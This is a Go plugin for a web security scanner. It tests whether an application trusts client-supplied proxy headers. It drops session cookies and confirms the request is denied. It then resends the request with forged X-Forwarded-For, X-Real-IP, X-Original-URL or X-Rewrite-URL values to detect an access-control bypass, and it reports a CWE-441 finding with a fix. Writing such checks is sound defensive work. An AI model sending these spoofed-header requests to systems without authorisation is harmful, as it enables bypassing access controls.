package plugin

import (
	"strings"

	"jungle_happy_Scan/internal/diff"
	"jungle_happy_Scan/internal/httpraw"
	"jungle_happy_Scan/internal/model"
)

type ProxyTrustBypass struct{}

func (ProxyTrustBypass) Meta() model.PluginMeta {
	return StandardMeta("proxy_trust_bypass", "反向代理信任头权限绕过", "以匿名规范请求为拒绝控制，验证 Spring/CTP 是否信任客户端伪造的原始路径或内网来源头。", "state-changing", true)
}

type proxyTrustVariant struct {
	name    string
	request *httpraw.Request
}

func (p ProxyTrustBypass) Scan(ctx *Context) ([]model.Finding, error) {
	meta := p.Meta()
	anonymous, removed := httpraw.RemoveSessions(ctx.Request, httpraw.EffectiveSessionIdentifiers(ctx.Request, ctx.Config.SessionIdentifiers))
	if len(removed) == 0 {
		ctx.Progress(meta.ID, 1, 1)
		return nil, nil
	}
	variants := proxyTrustVariants(anonymous)
	total := 1 + len(variants)*2
	ctx.Progress(meta.ID, 0, total)
	denied, err := ctx.Send(anonymous)
	if err != nil {
		return nil, err
	}
	ctx.Progress(meta.ID, 1, total)
	if !diff.LikelyAuthDenied(denied, ctx.Config) {
		ctx.Progress(meta.ID, total, total)
		return nil, nil
	}
	done := 1
	for _, variant := range variants {
		first, sendErr := ctx.Send(variant.request)
		if sendErr != nil {
			return nil, sendErr
		}
		done++
		ctx.Progress(meta.ID, done, total)
		if !proxyBypassAccepted(ctx, first) {
			done++
			ctx.Progress(meta.ID, done, total)
			continue
		}
		second, sendErr := ctx.Send(variant.request)
		if sendErr != nil {
			return nil, sendErr
		}
		done++
		ctx.Progress(meta.ID, done, total)
		if !proxyBypassAccepted(ctx, second) || diff.Similarity(first, second, ctx.Config) < 0.90 {
			continue
		}
		return []model.Finding{Finding(meta, "伪造代理信任头绕过匿名访问控制", model.SeverityHigh, model.ConfidenceCertain, variant.name,
			"移除全部身份后规范请求被拒绝；加入单个客户端可控代理头后，两次响应均恢复到授权基线。",
			"仅在受信反向代理清洗并重写这些头；应用不得直接信任外部 X-Forwarded-For/X-Original-URL/X-Rewrite-URL。",
			[]model.Evidence{ctx.Evidence("匿名规范请求被拒绝", anonymous, &denied, map[string]any{"removed_sessions": removed}), ctx.Evidence("第一次代理头变体被接受", variant.request, &first, map[string]any{"variant": variant.name}), ctx.Evidence("第二次重复确认", variant.request, &second, map[string]any{"repeat_confirmed": true})}, "CWE-441")}, nil
	}
	return nil, nil
}

func proxyTrustVariants(anonymous *httpraw.Request) []proxyTrustVariant {
	originalTarget := anonymous.Target
	pathOnly := originalTarget
	if before, _, ok := strings.Cut(pathOnly, "?"); ok {
		pathOnly = before
	}
	root := anonymous.ReplaceTarget("/")
	return []proxyTrustVariant{
		{"header:X-Forwarded-For", anonymous.WithHeader("X-Forwarded-For", "127.0.0.1")},
		{"header:X-Real-IP", anonymous.WithHeader("X-Real-IP", "127.0.0.1")},
		{"header:X-Original-URL", root.WithHeader("X-Original-URL", pathOnly)},
		{"header:X-Rewrite-URL", root.WithHeader("X-Rewrite-URL", pathOnly)},
	}
}

func proxyBypassAccepted(ctx *Context, response model.Response) bool {
	return response.StatusCode >= 200 && response.StatusCode < 300 && !diff.LikelyAuthDenied(response, ctx.Config) && diff.Similarity(ctx.Baseline, response, ctx.Config) >= 0.84
}
